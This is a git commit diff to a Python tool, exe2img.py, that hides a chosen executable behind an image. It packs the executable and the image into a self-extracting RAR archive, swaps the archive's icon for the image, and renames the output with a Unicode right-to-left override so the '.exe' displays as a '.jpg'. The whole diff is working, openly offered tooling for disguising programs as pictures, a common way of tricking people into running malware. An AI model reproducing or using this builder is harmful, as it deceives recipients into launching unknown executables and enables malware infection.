f2651e95e4256593406fb81934fb44551fc90f22
jeff160 <141229412+jeff-160@users.noreply.github.com>
2025-03-12 08:34:47 +0800

    Add files via upload

--- exe2img.py
+++ exe2img.py
@@ -1,8 +1,8 @@
-import sys
 import os
 import subprocess
 from wand.image import Image
 import random, string
+import argparse
 
 ICON = "temp.ico"
 CONFIG = "config.txt"
@@ -10,7 +10,6 @@ CONFIG = "config.txt"
 def create_icon(img: str):
     with Image(filename=img) as img:
         img.resize(512, 512)
-
         img.save(filename=ICON)
 
 def create_archive(exe: str, img: str):
@@ -21,29 +20,33 @@ def create_archive(exe: str, img: str):
 
     temp = "temp.exe"
     out = "archive.exe"
+    script = "main.bat"
 
-    commands = [
-        f'rar a -sfx -z{CONFIG} {temp} {exe} {img}',
-        f'ResourceHacker.exe -open {temp} -save {temp} -action delete -res ICONGROUP,1,',
-        f'ResourceHacker.exe -open {temp} -save {out} -action add -res temp.ico -mask ICONGROUP,1,'
-    ]
+    with open(script, "w") as f:
+        f.write("\n".join([
+            f'rar a -sfx -z{CONFIG} {temp} "{exe}" "{img}"',
+            f'ResourceHacker.exe -open {temp} -save {temp} -action delete -res ICONGROUP,1,',
+            f'ResourceHacker.exe -open {temp} -save {out} -action add -res {ICON} -mask ICONGROUP,1,'
+        ]))
 
-    for command in commands:
-        subprocess.run(["cmd", "/c", command])
+    subprocess.run([script])
 
     os.rename(out, f"{''.join(random.choices(string.ascii_lowercase, k=6))}\u202Egpj.exe")
 
     os.remove(ICON)
     os.remove(CONFIG)
     os.remove(temp)
+    os.remove(script)
+
+
+parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
+parser.add_argument("-e", type=str, required=True, help="Executable to hide")
+parser.add_argument("-i", type=str, required=True, help="Image to embed executable into")
 
 def main():
-    args = sys.argv[1:]
+    args = parser.parse_args()
 
-    if len(args) != 2:
-        raise Exception("Only 2 arguments should be supplied")
-
-    create_archive(*args)
+    create_archive(args.e, args.i)
   
 
 if __name__ == "__main__":
